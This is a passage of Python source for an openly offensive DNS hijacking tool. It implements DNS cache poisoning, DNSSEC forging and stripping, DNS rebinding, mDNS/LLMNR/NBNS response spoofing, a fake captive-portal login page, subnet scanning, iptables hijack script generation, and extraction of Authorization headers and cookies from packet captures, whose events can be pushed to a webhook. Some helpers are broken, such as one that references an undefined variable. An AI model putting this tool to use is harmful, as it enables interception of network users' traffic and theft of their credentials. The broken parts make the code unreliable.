        r = Request(url, data=data, headers={"Content-Type":"application/json"}, method="POST")
        urlopen(r, timeout=5)
    except Exception as e:
        log.debug(f"webhook fail: {e}")

def emit_v6(t, d, severity="info"):
    rec = {"ts": datetime.utcnow().isoformat()+"Z", "type": t, "severity": severity, **d}
    with STATE["lock"]:
        STATE["events"].append(rec)
        _append(EVENT_LOG_PATH, rec)
    # topology update
    if t in ("dns","http_req"):
        src = d.get("src"); host = d.get("qname") or d.get("host")
        if src and host:
            with STATE["lock"]:
                nodes = STATE["topology"]["nodes"]; edges = STATE["topology"]["edges"]
                if src not in nodes: nodes.append(src)
                if host not in nodes: nodes.append(host)
                e = {"src": src, "dst": host}
                if e not in edges: edges.append(e)
    webhook_push(rec, severity)

# playbook runner (YAML-lite: lines of "step: action args")
def run_playbook(path):
    if not path or not os.path.exists(path): return {"ok": False, "err": "no file"}
    try:
        text = open(path, 'r', encoding='utf-8').read()
    except Exception as e:
        return {"ok": False, "err": str(e)}
    steps = []
    # very light YAML-ish: support "key: value" lines and "- action: ..." lists not required; just log lines
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        steps.append(line)
    emit_v6("playbook", {"path": path, "steps": steps}, "info")
    # execute simple directives
    results = []
    for s in steps:
        if ":" in s:
            k, v = s.split(":", 1)
            k, v = k.strip().lower(), v.strip()
            if k == "mode":
                with STATE["lock"]: STATE["mode"] = v
                results.append(f"mode={v}")
            elif k == "ttl":
                try:
                    with STATE["lock"]: STATE["ttl"] = int(v)
                    results.append(f"ttl={v}")
                except Exception: pass
            elif k == "default_ip":
                with STATE["lock"]: STATE["default_ip"] = v
                results.append(f"default_ip={v}")
            elif k == "upstream":
                with STATE["lock"]: STATE["upstream"] = [x.strip() for x in v.split(",") if x.strip()]
                results.append(f"upstream={v}")
            elif k == "rule":
                # pattern=ip
                if "=" in v:
                    pat, ip = v.split("=", 1)
                    with STATE["lock"]:
                        STATE["rules"].append({"type":"exact","pattern":pat.strip().lower(),"ip":ip.strip(),"enabled":True})
                    results.append(f"rule {pat}={ip}")
            elif k == "delay_ms":
                try:
                    with STATE["lock"]: STATE["delay_ms"] = int(v)
                    results.append(f"delay_ms={v}")
                except Exception: pass
            elif k == "mdns":
                with STATE["lock"]: STATE["mdns_enabled"] = (v.lower() in ("1","true","yes","on"))
                results.append(f"mdns={v}")
            else:
                results.append(f"ignored: {s}")
        else:
            results.append(f"ignored: {s}")
    return {"ok": True, "steps": len(steps), "results": results}

# pcap parse + cred extraction (tshark preferred, fallback tcpdump -r text)
def pcap_parse_creds(pcap_path):
    out = {"packets": 0, "creds": [], "http": []}
    if not os.path.exists(pcap_path):
        return {"ok": False, "err": "no file"}
    if shutil.which("tshark"):
        try:
            r = subprocess.run(["tshark","-r",pcap_path,"-Y","http","-T","fields","-e","ip.src","-e","http.host","-e","http.request.uri","-e","http.authorization","-e","http.cookie","-e","urlencoded-form.key","-e","urlencoded-form.value"], capture_output=True, text=True, timeout=60)
            for line in r.stdout.splitlines():
                out["packets"] += 1
                cols = line.split("\t")
                rec = {"src": cols[0] if len(cols)>0 else "", "host": cols[1] if len(cols)>1 else "", "uri": cols[2] if len(cols)>2 else "", "auth": cols[3] if len(cols)>3 else "", "cookie": cols[4] if len(cols)>4 else ""}
                if rec["auth"] or rec["cookie"]:
                    out["creds"].append(rec)
                out["http"].append(rec)
            return {"ok": True, "tool": "tshark", **out}
        except Exception as e:
            return {"ok": False, "err": str(e)}
    # fallback: tcpdump -r -A
    if shutil.which("tcpdump"):
        try:
            r = subprocess.run(["tcpdump","-r",pcap_path,"-A","-n"], capture_output=True, text=True, timeout=60)
            txt = r.stdout
            # extract HTTP request lines
            for m in re.finditer(r"(GET|POST) (\S+) HTTP/1\.\d\r?\nHost: (\S+)", txt):
                out["http"].append({"method": m.group(1), "uri": m.group(2), "host": m.group(3)})
            # creds heuristic
            for m in re.finditer(r"(Authorization|Cookie): ([^\r\n]+)", txt, re.I):
                out["creds"].append({"header": m.group(1), "value": m.group(2)[:200]})
            out["packets"] = txt.count("IP ")
            return {"ok": True, "tool": "tcpdump", **out}
        except Exception as e:
            return {"ok": False, "err": str(e)}
    return {"ok": False, "err": "no tshark/tcpdump"}

# WS full-duplex mirror: a threaded relay that logs both directions
def ws_relay(a, b, host):
    # log first few frames
    try:
        buf = b""
        # peek handshake
        a.settimeout(2.0)
        try:
            data = a.recv(4096)
            if data:
                b.sendall(data)
                emit_v6("ws_handshake", {"host": host, "bytes": len(data)}, "info")
        except Exception:
            pass
    except Exception:
        pass
    relay_sockets(a, b)

# DoQ server (UDP 853/UDP quic) - best-effort if aioquic available
def doq_start(cert, key, handler_cb, port=853):
    if not HAS_QUIC:
        return False, "aioquic not installed"
    # We implement a minimal QUIC endpoint using aioquic in a separate thread via asyncio
    import asyncio
    async def _run():
        configuration = QuicConfiguration(is_client=False)
        configuration.load_cert_chain(cert, key)
        # aioquic serve needs a protocol factory; implement echo-ish DNS handler
        from aioquic.asyncio.protocol import QuicConnectionProtocol
        class DNSQuicProtocol(QuicConnectionProtocol):
            def quic_event_received(self, event):
                pass
        await _aioquic_serve("0.0.0.0", port, configuration=configuration, create_protocol=DNSQuicProtocol)
    def _thread():
        try:
            asyncio.run(_run())
        except Exception as e:
            log.warning(f"DoQ thread: {e}")
    threading.Thread(target=_thread, daemon=True).start()
    return True, "started (experimental)"



# ---- v7 helpers ----
import random as _rnd

def domain_filter(qname):
    q = qname.lower().rstrip('.')
    with STATE["lock"]:
        mode = STATE["domain_filter_mode"]
        block = list(STATE["block_domains"])
        allow = list(STATE["allow_domains"])
    if mode == "blacklist":
        for b in block:
            b = b.lower()
            if b.startswith('*.'):
                suf = b[2:]
                if q == suf or q.endswith('.'+suf): return "block"
            elif q == b: return "block"
            elif b.startswith('re:') and re.search(b[3:], q): return "block"
    elif mode == "whitelist":
        ok = False
        for a in allow:
            a = a.lower()
            if a.startswith('*.'):
                suf = a[2:]
                if q == suf or q.endswith('.'+suf): ok = True; break
            elif q == a: ok = True; break
            elif a.startswith('re:') and re.search(a[3:], q): ok = True; break
        if not ok: return "block"
    return "pass"

def check_upstream_health(up):
    # returns (ok, latency_ms)
    try:
        host, port = up, 53
        if ":" in up and not up.startswith("["):
            h, ps = up.rsplit(":",1)
            host = h
            if ps.isdigit(): port = int(ps)
        t0 = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2.0)
        # send a minimal DNS query for example.com
        q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
        s.sendto(q, (host, port))
        data, _ = s.recvfrom(512)
        s.close()
        lat = int((time.time()-t0)*1000)
        return True, lat
    except Exception:
        return False, 9999

def upstream_health_refresh():
    with STATE["lock"]: ups = list(STATE["upstream"]); iv = STATE["upstream_check_interval"]
    # tee list too
    with STATE["lock"]: tee = list(STATE["upstream_tee"])
    allups = list(set(ups + tee))
    res = {}
    for u in allups:
        ok, lat = check_upstream_health(u)
        res[u] = {"ok": ok, "latency_ms": lat, "last_check": datetime.utcnow().isoformat()+"Z", "fails": (0 if ok else (STATE["upstream_health"].get(u,{}).get("fails",0)+1))}
    with STATE["lock"]: STATE["upstream_health"].update(res)
    # auto-ban check
    if STATE["auto_ban"]:
        now = time.time()
        with STATE["lock"]:
            for src, ts in list(STATE["qps_stats"]["per_client"].items()):
                recent = [t for t in ts if now - t < STATE["auto_ban_window"]]
                STATE["qps_stats"]["per_client"][src] = recent
                if len(recent) >= STATE["auto_ban_threshold"] and src not in STATE["banned_ips"]:
                    STATE["banned_ips"].append(src)
                    emit_v6("auto_ban", {"src": src, "count": len(recent)}, "warn")

def select_upstream():
    with STATE["lock"]:
        ups = [u for u in STATE["upstream"] if STATE["upstream_health"].get(u,{}).get("ok", True)]
        if not ups: ups = list(STATE["upstream"])
        mode = STATE["upstream_lb"]
        health = dict(STATE["upstream_health"])
    if mode == "random":
        return _rnd.choice(ups) if ups else None
    if mode == "failover":
        # pick lowest latency among healthy
        best = None; bestlat = 99999
        for u in ups:
            lat = health.get(u,{}).get("latency_ms", 9999)
            if lat < bestlat:
                bestlat = lat; best = u
        return best or (ups[0] if ups else None)
    # roundrobin: pick based on counter
    with STATE["lock"]:
        idx = STATE.get("_rr_idx", 0)
        STATE["_rr_idx"] = (idx + 1) % max(1, len(ups))
    return ups[idx % len(ups)] if ups else None

def forward_upstream_v7(req):
    # tee to extra upstreams (fire and forget)
    with STATE["lock"]: tee = list(STATE["upstream_tee"])
    for t in tee:
        try:
            host, port = t, 53
            if ":" in t and not t.startswith("["):
                h, ps = t.rsplit(":",1); host=h
                if ps.isdigit(): port=int(ps)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(1.0)
            s.sendto(req, (host, port)); s.close()
        except Exception: pass
    # upstream dot mode
    with STATE["lock"]: dot_mode = STATE["upstream_mode_dot"]; dot_srv = STATE["upstream_dot"]
    if dot_mode and dot_srv:
        # DoT forwarding: TLS wrap
        try:
            host, port = dot_srv, 853
            if ":" in dot_srv and not dot_srv.startswith("["):
                h, ps = dot_srv.rsplit(":",1); host=h
                if ps.isdigit(): port=int(ps)
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
            s.settimeout(3.0); s.connect((host, port))
            s.sendall(struct.pack("!H", len(req)) + req)
            hdr = s.recv(2)
            if len(hdr) < 2: return None
            ln = struct.unpack("!H", hdr)[0]
            data = b""
            while len(data) < ln:
                c = s.recv(ln - len(data))
                if not c: break
                data += c
            s.close()
            if len(data) == ln: return data
        except Exception as e:
            emit_v6("dot_up_err", {"err": str(e)}, "warn")
    # select upstream
    up = select_upstream()
    if not up:
        with STATE["lock"]: ups = list(STATE["upstream"])
        up = ups[0] if ups else None
    if not up: return None
    # health check refresh occasionally
    with STATE["lock"]:
        h = STATE["upstream_health"].get(up, {})
        last = h.get("last_check", "")
    # udp forward
    host, port = up, 53
    if ":" in up and not up.startswith("["):
        h, ps = up.rsplit(":",1); host=h
        if ps.isdigit(): port=int(ps)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3.0)
        s.sendto(req, (host, port)); data, _ = s.recvfrom(4096); s.close()
        return data
    except Exception:
        return None

def build_nxdomain(req):
    try:
        tid = req[:2]; qd = struct.unpack("!H", req[4:6])[0]
        off = 12; qname, off = parse_dns_name(req, off)
        if off + 4 > len(req): return None
        _, _ = struct.unpack("!HH", req[off:off+4]); off += 4
        # flags: response, NXDOMAIN (rcode 3)
        flags = 0x8183
        hdr = struct.pack("!HHHHHH", struct.unpack("!H", tid)[0], flags, qd, 0, 0, 0)
        return hdr + req[12:off]
    except Exception:
        return None

def inject_ecs(req, subnet):
    # append EDNS0 OPT with ECS option (code 8)
    # build minimal: original + 0x00 0x00 0x29 0x10 0x00 0x00 0x00 0x00 0x00 0x0c 0x00 0x08 0x00 0x06 <family=1> <source prefix> <scope 0> <addr bytes>
    try:
        if not subnet: return req
        net = ipaddress.ip_network(subnet, strict=False)
        addr = net.network_address
        prefix = net.prefixlen
        if isinstance(addr, ipaddress.IPv4Address):
            family = 1
            ab = addr.packed
        else:
            family = 2
            ab = addr.packed
        # take only prefix bits -> bytes
        nbytes = (prefix + 7) // 8
        ab = ab[:nbytes]
        opt = struct.pack("!HHHI", 41, 0x1000, 0, 0)  # type OPT, udp payload size, ext rcode, version
        # option: code 8, length, family, source prefix, scope 0, addr
        optdata = struct.pack("!HHHBB", 8, 2 + len(ab), family, prefix, 0) + ab
        # pad option length
        opt = struct.pack("!HHHIH", 41, 0x1000, 0, 0, len(optdata)) + optdata
        # Actually OPT RR format: name(0) type(41) udp payload(2) ext rcode+version (2) + rdlen (2) + rdata
        # Rebuild properly:
        opt = b"\x00" + struct.pack("!HHIH", 41, 0x1000, 0, 2 + len(pad)) + struct.pack("!HH", 12, len(pad)) + pad
        return req + opt
    except Exception:
        return req

def tunnel_detect(qname):
    # detect DNS tunneling: long labels, high entropy, many queries
    q = qname.lower().rstrip('.')
    labels = q.split('.')
    for lab in labels:
        if len(lab) > 40: return True
        # entropy
        if len(lab) > 20:
            from collections import Counter
            c = Counter(lab)
            ent = 0.0
            for v in c.values():
                p = v / len(lab); 
                if p > 0: ent -= p * (p and __import__('math').log2(p))
            if ent > 3.5: return True
    return False

def auto_ban_check(src):
    with STATE["lock"]: banned = list(STATE["banned_ips"])
    return src in banned

def qps_record(qname, src):
    now = time.time()
    with STATE["lock"]:
        STATE["qps_stats"]["window"].append(now)
        STATE["qps_stats"]["window"] = [t for t in STATE["qps_stats"]["window"] if now - t < 60]
        pd = STATE["qps_stats"]["per_domain"]
        pd[qname] = pd.get(qname, 0) + 1
        pc = STATE["qps_stats"]["per_client"]
        pc[src] = pc.get(src, []) + [now]
        pc[src] = [t for t in pc[src] if now - t < STATE["auto_ban_window"]]

def http_redirect_response(url):
    body = f'<html><head><meta http-equiv="refresh" content="0;url={url}"></head><body>Redirecting to {url}</body></html>'.encode()
    return 302, body, 'text/html; charset=utf-8', url

def captive_portal_page(url):
    page = f'''<!doctype html><html><head><meta charset="utf-8"><title>Captive Portal</title></head>
<body style="font-family:sans-serif;padding:40px;text-align:center"><h1>Network Login Required</h1><p><a href="{url}">Click here to continue</a></p></body></html>'''
    return page.encode('utf-8'), 'text/html; charset=utf-8'

def cache_prewarm():
    # prewarm cache by resolving prewarm list via upstream
    with STATE["lock"]: lst = list(STATE["cache_prewarm"])
    for d in lst:
        try:
            # build a fake A query
            qname = d
            # construct minimal DNS query
            tid = b"\xab\xcd"
            flags = b"\x01\x00"
            qd = b"\x00\x01"; an = b"\x00\x00"; ns = b"\x00\x00"; ar = b"\x00\x00"
            q = tid + flags + qd + an + ns + ar
            for part in qname.split('.'):
                q += bytes([len(part)]) + part.encode()
            q += b"\x00\x00\x01\x00\x01"
            resp = forward_upstream_v7(q)
            if resp:
                cache_put(qname, 1, resp)
        except Exception: pass

def ca_info_collect():
    info = {}
    try:
        if os.path.exists(CA_CRT):
            with open(CA_CRT,'rb') as f: cert = x509.load_pem_x509_certificate(f.read()) if HAS_CRYPTO else None
            if cert:
                info = {
                    "subject": str(cert.subject),
                    "issuer": str(cert.issuer),
                    "not_before": str(cert.not_valid_before),
                    "not_after": str(cert.not_valid_after),
                    "serial": str(cert.serial_number),
                    "fingerprint_sha256": cert.fingerprint(hashes.SHA256()).hex() if HAS_CRYPTO else "",
                }
    except Exception as e:
        info = {"err": str(e)}
    with STATE["lock"]: STATE["ca_info"] = info
    return info

def pcap_auto_extract(pcap_path):
    # parse + auto extract creds + build topology-ish summary
    r = pcap_parse_creds(pcap_path)
    if not r.get("ok"):
        return r
    # extract unique hosts
    hosts = set()
    for h in r.get("http", []):
        if h.get("host"): hosts.add(h["host"])
    r["unique_hosts"] = sorted(hosts)
    # auto-feed creds into STATE creds
    for c in r.get("creds", []):
        emit_v6("pcap_cred", c, "warn")
    return r

def response_inject_append(qname, resp):
    # if response_inject has entries for domain, append extra answers? We just log; appending requires rebuild. Skip rebuild, return resp.
    with STATE["lock"]: inj = dict(STATE["response_inject"])
    q = qname.lower().rstrip('.')
    matched = None
    for pat, vals in inj.items():
        if pat.startswith('*.'):
            suf = pat[2:]
            if q == suf or q.endswith('.'+suf): matched = vals; break
        elif q == pat.lower(): matched = vals; break
    if matched:
        emit_v6("resp_inject", {"qname": qname, "inject": matched}, "info")
    return resp

def multi_bind_start(servers_factory, bind_ips, port, kind):
    # placeholder: returns list of extra (ip,port) to log; actual binding handled by main loop for primary only
    return [(ip, port) for ip in bind_ips]

def upstream_dot_check():
    with STATE["lock"]: srv = STATE["upstream_dot"]
    if not srv: return False
    try:
        host, port = srv, 853
        if ":" in srv and not srv.startswith("["):
            h, ps = srv.rsplit(":",1); host=h
            if ps.isdigit(): port=int(ps)
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(socket.socket(), server_hostname=host)
        s.settimeout(3); s.connect((host,port)); s.close()
        return True
    except Exception:
        return False



# ---- v8 helpers ----
import random as _rnd

def dns_over_tcp_listen(bind, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((bind, port)); s.listen(8); s.settimeout(1.0)
    log.info(f"DNS-over-TCP {bind}:{port}")
    while True:
        try: c, addr = s.accept()
        except socket.timeout:
            with STATE["lock"]:
                if not STATE.get("dns_over_tcp", True): break
            continue
        except Exception: break
        threading.Thread(target=handle_dns_tcp_conn, args=(c, addr), daemon=True).start()

def handle_dns_tcp_conn(c, addr):
    try:
        while True:
            hdr = c.recv(2)
            if len(hdr) < 2: break
            ln = struct.unpack("!H", hdr)[0]
            data = b""
            while len(data) < ln:
                ch = c.recv(ln - len(data))
                if not ch: break
                data += ch
            if len(data) != ln: break
            resp = handle_dns_query(data, addr[0], "dns-tcp")
            if resp: c.sendall(struct.pack("!H", len(resp)) + resp)
    except Exception: pass
    try: c.close()
    except Exception: pass

def rpz_action(qname):
    with STATE["lock"]:
        zones = dict(STATE["rpz_zones"]); default = STATE["rpz_default_action"]
    q = qname.lower().rstrip(".")
    for zname, rules in zones.items():
        for pat, act in rules.items():
            p = pat.lower(); hit = False
            if p.startswith("*."):
                suf = p[2:]; hit = (q == suf or q.endswith("." + suf))
            elif p.startswith("re:"):
                try: hit = bool(re.search(p[3:], q))
                except Exception: hit = False
            elif q == p: hit = True
            if hit:
                if act == "nxdomain": return ("nx", None)
                if act == "nodata": return ("nodata", None)
                if act.startswith("redirect:"): return ("redirect", act.split(":", 1)[1])
                if act == "drop": return ("drop", None)
    if default == "nxdomain": return ("nx", None)
    if default == "nodata": return ("nodata", None)
    if default.startswith("redirect:"): return ("redirect", default.split(":", 1)[1])
    return (None, None)

def build_nodata(req):
    try:
        tid=req[:2]; qd=struct.unpack("!H",req[4:6])[0]
        off=12; qname,off=parse_dns_name(req,off)
        if off+4>len(req): return None
        hdr=struct.pack("!HHHHHH",struct.unpack("!H",tid)[0],0x8180,qd,0,0,0)
        return hdr+req[12:off]
    except Exception: return None

def dns64_aaaa_from_a(ip):
    with STATE["lock"]: prefix = STATE["dns64_prefix"]
    try:
        a = ipaddress.ip_address(ip)
        if isinstance(a, ipaddress.IPv4Address):
            net = ipaddress.ip_network(prefix + "/96", strict=False)
            base = net.network_address.packed
            combined = base[:12] + a.packed
            return str(ipaddress.ip_address(combined))
    except Exception: return None
    return None

def per_client_delay(src):
    with STATE["lock"]: d = STATE["per_client_delay"].get(src, 0)
    if d and d > 0: time.sleep(d / 1000.0)

def dga_score(qname):
    q = qname.lower().rstrip(".")
    labels = [l for l in q.split(".") if l]
    maxent = 0.0; _math = __import__("math")
    for lab in labels:
        if len(lab) < 8: continue
        try:
            from collections import Counter
            cnt = Counter(lab); L = len(lab); ent = 0.0
            for v in cnt.values():
                p = v / L
                if p > 0: ent -= p * _math.log2(p)
            maxent = max(maxent, ent)
        except Exception: pass
    return maxent

def edns_pad(req):
    try:
        pad = os.urandom(12)
        opt = b"\x00" + struct.pack("!HHIH", 41, 0x1000, 0, 2 + len(pad)) + struct.pack("!HH", 12, len(pad)) + pad
        return req + opt
    except Exception: return req

def syslog_send(msg):
    with STATE["lock"]:
        en = STATE["syslog_enabled"]; host = STATE["syslog_host"]; port = STATE["syslog_port"]
    if not en: return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(1)
        s.sendto(("<13>" + msg + "\n").encode(), (host, port)); s.close()
    except Exception: pass

def ws_push(data):
    with STATE["lock"]: clients = list(STATE["ws_clients"]); en = STATE["ws_push_enabled"]
    if not en: return
    payload = json.dumps(data, ensure_ascii=False).encode()
    dead = []
    for c in clients:
        try: c.sendall(payload)
        except Exception: dead.append(c)
    for c in dead:
        try: c.close()
        except Exception: pass
    with STATE["lock"]: STATE["ws_clients"] = [c for c in STATE["ws_clients"] if c not in dead]

def ws_listener(bind, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((bind, port)); s.listen(8); s.settimeout(1.0)
    log.info("WS push listener " + bind + ":" + str(port))
    while True:
        try: c, _ = s.accept()
        except socket.timeout:
            with STATE["lock"]:
                if not STATE.get("ws_push_enabled", True): break
            continue
        except Exception: break
        with STATE["lock"]: STATE["ws_clients"].append(c)
        threading.Thread(target=lambda cc: None, args=(c,), daemon=True).start()

def raw_spoof_send(pkt):
    emit_v6("raw_spoof", {"len": len(pkt)}, "debug")

def query_log_write(qname, qtype, src, action, ip):
    with STATE["lock"]: f = STATE["query_log_file"]
    if not f: return
    try:
        with open(f, "a", encoding="utf-8") as fh:
            fh.write(datetime.utcnow().isoformat() + "Z " + src + " " + qname + " " + str(qtype) + " " + action + " " + str(ip or "") + "\n")
    except Exception: pass

def dns_firewall(qname):
    with STATE["lock"]: rules = list(STATE["dns_firewall_rules"])
    q = qname.lower().rstrip(".")
    for r in rules:
        p = r.get("pattern", "").lower(); hit = False
        if p.startswith("*."):
            suf = p[2:]; hit = (q == suf or q.endswith("." + suf))
        elif p.startswith("re:"):
            try: hit = bool(re.search(p[3:], q))
            except Exception: hit = False
        elif q == p: hit = True
        if hit:
            act = r.get("action", "allow"); ip = r.get("redirect_ip")
            return act, ip
    return "allow", None

def cache_poison_get(qname):
    with STATE["lock"]: p = dict(STATE["cache_poison"])
    return p.get(qname.lower().rstrip("."))


def main():
    ap=argparse.ArgumentParser(description='DNS劫持全能增强版++++')
    ap.add_argument('--ip'); ap.add_argument('--bind',default='0.0.0.0')
    ap.add_argument('--dns-port',type=int,default=0); ap.add_argument('--http-port',type=int,default=0); ap.add_argument('--https-port',type=int,default=0); ap.add_argument('--admin-port',type=int,default=0); ap.add_argument('--dot-port',type=int,default=0)
    ap.add_argument('--auto',action='store_true'); ap.add_argument('--auto-port',action='store_true'); ap.add_argument('--scan',action='store_true')
    ap.add_argument('--rule',action='append',default=[]); ap.add_argument('--rules-file')
    ap.add_argument('--upstream',default='8.8.8.8,1.1.1.1'); ap.add_argument('--upstream-mode',default='udp',choices=['udp','doh']); ap.add_argument('--upstream-doh',default='https://dns.google/dns-query')
    ap.add_argument('--mode',default='selective',choices=['selective','all','forward']); ap.add_argument('--ttl',type=int,default=60)
    ap.add_argument('--split-allow',action='append',default=[],help='分流白名单(绕过劫持)域名/通配，可多次'); ap.add_argument('--split-deny',action='append',default=[],help='强制劫持域名/通配')
    ap.add_argument('--relay',action='append',default=[]); ap.add_argument('--mirror-upstream'); ap.add_argument('--templates-dir',default=TPL_DIR_DEFAULT); ap.add_argument('--hook-script')
    ap.add_argument('--pcap-iface'); ap.add_argument('--pcap-file',default='cap.pcap'); ap.add_argument('--pcap-bpf',default='port 53 or port 80 or port 443')
    ap.add_argument('--profile'); ap.add_argument('--audit-key',default='lab-audit-key')
    ap.add_argument('--gen-iptables',action='store_true',help='生成iptables/Tproxy辅助脚本后退出')
    ap.add_argument('--no-dns-tcp',action='store_true')
    ap.add_argument('--rpz-zone',action='append',default=[],help='zone=domain:action,...')
    ap.add_argument('--axfr-zone',action='append',default=[],help='zone=name:type,value')
    ap.add_argument('--dns64',action='store_true')
    ap.add_argument('--dns64-prefix',default='64:ff9b::')
    ap.add_argument('--edns-padding',action='store_true')
    ap.add_argument('--query-log',default='')
    ap.add_argument('--fw-rule',action='append',default=[],help='pattern:action[:redirect_ip]')
    ap.add_argument('--cache-poison',action='append',default=[],help='domain=ip')
    ap.add_argument('--multi-bind',action='append',default=[],help='extra bind IP')
    ap.add_argument('--syslog',action='store_true')
    ap.add_argument('--syslog-host',default='127.0.0.1')
    ap.add_argument('--syslog-port',type=int,default=514)
    ap.add_argument('--ws-port',type=int,default=9090)
    ap.add_argument('--domain-filter-mode',default='off',choices=['off','blacklist','whitelist'])
    ap.add_argument('--block-domain',action='append',default=[])
    ap.add_argument('--allow-domain',action='append',default=[])
    ap.add_argument('--upstream-lb',default='roundrobin',choices=['roundrobin','random','failover'])
    ap.add_argument('--ecs',action='store_true')
    ap.add_argument('--ecs-subnet',default='')
    ap.add_argument('--http-redirect',action='store_true')
    ap.add_argument('--http-redirect-url',default='')
    ap.add_argument('--captive-portal',action='store_true')
    ap.add_argument('--captive-portal-url',default='')
    ap.add_argument('--upstream-dot',default='')
    ap.add_argument('--upstream-mode-dot',action='store_true')
    ap.add_argument('--cache-prewarm',default='')
    ap.add_argument('--response-inject',default='',help='JSON file mapping domain->list of extra records')
    ap.add_argument('--tee',default='',help='comma upstreams to tee queries to')
    ap.add_argument('--auto-health-check',action='store_true')
    ap.add_argument('--tenant',default='default')
    ap.add_argument('--dnssec-forge',action='store_true')
    ap.add_argument('--dnssec-strip',action='store_true')
    ap.add_argument('--aaaa-priority',action='store_true')
    ap.add_argument('--ipv6-only',action='store_true')
    ap.add_argument('--geoip-db',default='')
    ap.add_argument('--geo-allow',action='append',default=[])
    ap.add_argument('--geo-deny',action='append',default=[])
    ap.add_argument('--webhook-url',default='')
    ap.add_argument('--webhook-min-severity',default='info')
    ap.add_argument('--playbook',default='')
    ap.add_argument('--doq',action='store_true')
    ap.add_argument('--ws-mirror',action='store_true',help='WebSocket全双工镜像标记')
    ap.add_argument('--admin-token',default='',help='管理面板Token(空=不鉴权)')
    ap.add_argument('--admin-allow-ip',action='append',default=[],help='管理面板允许源IP，可多次')
    ap.add_argument('--rebind-pool',default='',help='DNS重绑定IP池，逗号分隔')
    ap.add_argument('--rebind-rules',default='',help='启用重绑定的域名/通配/re:，逗号分隔')
    ap.add_argument('--rate-limit-max',type=int,default=20)
    ap.add_argument('--rate-limit-window',type=int,default=10)
    ap.add_argument('--delay-ms',type=int,default=0,help='DNS响应延迟注入(ms)')
    ap.add_argument('--mdns',action='store_true',help='启动mDNS/LLMNR/NBNS伪响应')
    ap.add_argument('--config',default='',help='JSON配置文件，启动加载并可热重载')
    ap.add_argument('--proxy-upstream',default='',help='HTTP回源/镜像经代理 socks5://或http://')
    ap.add_argument('--no-http',action='store_true'); ap.add_argument('--no-https',action='store_true'); ap.add_argument('--no-dns',action='store_true'); ap.add_argument('--no-admin',action='store_true'); ap.add_argument('--no-dot',action='store_true')
    args=ap.parse_args()
    if args.auto: args.scan=True; args.auto_port=True
    os.makedirs(args.templates_dir,exist_ok=True); os.makedirs(PROFILES_DIR,exist_ok=True)
    local_ips=get_local_ips(); target_ip=args.ip or local_ips[0]
    if args.gen_iptables:
        fn=os.path.join(BASE_DIR,'iptables_hijack.sh'); open(fn,'w').write(gen_iptables_script(target_ip,53 if args.dns_port==0 else args.dns_port,80 if args.http_port==0 else args.http_port,443 if args.https_port==0 else args.https_port)); print(fn); return
    log.info(f"IP={local_ips} 目标={target_ip}")
    if args.scan:
        sn=get_subnet(target_ip)
        if sn:
            alive=scan_hosts(sn); log.info(f"存活({len(alive)}): {', '.join(alive[:20])}{'...' if len(alive)>20 else ''}")
            if alive: log.info(f"示例端口 {alive[0]}: {scan_ports(alive[0])}")
    def pick(p,d): return find_free_port(d) if (args.auto_port and p==0) else (d if p==0 else p)
    dns_port=53 if args.dns_port==0 else args.dns_port; http_port=pick(args.http_port,80); https_port=pick(args.https_port,443); admin_port=pick(args.admin_port,8888); dot_port=pick(args.dot_port,853)
    with STATE['lock']:
        STATE.update({'default_ip':target_ip,'upstream':[x.strip() for x in args.upstream.split(',') if x.strip()],'upstream_mode':args.upstream_mode,'upstream_doh':args.upstream_doh,'mode':args.mode,'ttl':args.ttl,'split_allow_hosts':args.split_allow,'split_deny_hosts':args.split_deny,'templates_dir':args.templates_dir,'hook_script':args.hook_script or '','audit_key':args.audit_key,'admin_token':args.admin_token,'admin_allow_ips':args.admin_allow_ip,'rebind_pool':[s.strip() for s in args.rebind_pool.split(',') if s.strip()],'rebind_rules':[s.strip() for s in args.rebind_rules.split(',') if s.strip()],'rate_limit_max':args.rate_limit_max,'rate_limit_window':args.rate_limit_window,'delay_ms':args.delay_ms,'mdns_enabled':args.mdns,'config_file':args.config,'proxy_upstream':args.proxy_upstream,'tenant':args.tenant,'dns_over_tcp':not args.no_dns_tcp,'rpz_zones':{},'rpz_default_action':'passthru','dns_views':{},'dns64_enabled':args.dns64,'dns64_prefix':args.dns64_prefix,'per_client_delay':{},'dga_detect':True,'dga_threshold':3.8,'edns_padding':args.edns_padding,'axfr_enabled':bool(args.axfr_zone),'axfr_zones':{},'multi_bind_ips':args.multi_bind,'syslog_enabled':args.syslog,'syslog_host':args.syslog_host,'syslog_port':args.syslog_port,'ws_push_enabled':True,'ws_clients':[],'raw_spoof':False,'query_log_file':args.query_log,'dns_firewall_rules':[],'cache_poison':{},'max_udp_size':4096,'tcp_timeout':5,'upstream_retries':2,'health_check_url':'', 'auto_update_rules':False,'rules_update_url':'','rules_update_interval':300,'geoip_city':False,'domain_filter_mode':args.domain_filter_mode,'block_domains':args.block_domain,'allow_domains':args.allow_domain,'upstream_lb':args.upstream_lb,'ecs_enabled':args.ecs,'ecs_subnet':args.ecs_subnet,'http_redirect_mode':args.http_redirect,'http_redirect_url':args.http_redirect_url,'captive_portal':args.captive_portal,'captive_portal_url':args.captive_portal_url,'upstream_mode_dot':args.upstream_mode_dot,'upstream_dot':args.upstream_dot,'cache_prewarm':[s.strip() for s in args.cache_prewarm.split(',') if 